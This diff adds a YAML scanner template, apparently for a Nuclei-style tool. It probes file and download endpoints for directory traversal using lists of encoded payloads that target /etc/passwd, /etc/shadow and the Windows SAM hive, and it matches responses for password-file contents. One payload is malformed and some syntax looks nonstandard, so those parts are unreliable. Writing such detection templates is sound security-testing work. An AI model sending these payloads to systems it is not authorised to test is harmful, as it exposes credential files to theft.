@@ -1,0 +1,63 @@
+id: directory-traversal-extended
+name: "Directory Traversal Extended Detection"
+severity: "high"
+tags: [traversal, lfi, path]
+description: |
+  扩展的路径遍历检测。
+  使用 range 循环遍历多个路径和编码方式。
+
+variables:
+  # 变量延迟解析：定义路径遍历载荷
+  traversal_payload: "../../etc/passwd"
+  traversal_payload_win: "..\\..\\windows\\system32\\config\\sam"
+
+http:
+  - raw: |
+      GET /api/files?path={{traversal_payload}} HTTP/1.1
+      Host: {{Hostname}}
+    range:
+      key: "traversal_payload"
+      values:
+        - "../../etc/passwd"
+        - "../../../etc/shadow"
+        - "....//....//etc/passwd"
+        - "%2e%2e/%2e%2e/etc/passwd"
+        - "..%2f..%2fetc%2fpasswd"
+        - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "..%252f..%252fetc%252fpasswd"
+        - "..%c0%af..%c0%af/etc/passwd"
+        - "..%c8%pc9%lf/etc/passwd"
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "bin:"
+          - "daemon:"
+          - "www-data"
+          - "content of /etc/passwd"
+      - type: status
+        status: [200]
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'root:')"
+
+  - raw: |
+      GET /api/download?file={{traversal_payload_win}} HTTP/1.1
+      Host: {{Hostname}}
+    range:
+      key: "traversal_payload_win"
+      values:
+        - "..\\..\\windows\\system32\\config\\sam"
+        - "..\\..\\win.ini"
+        - "..\\..\\boot.ini"
+        - "%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam"
+    matchers:
+      - type: word
+        words:
+          - "[sam]"
+          - "[versions]"
+          - "[386]"
+          - "[boot loader]"
+      - type: status
+        status: [200]
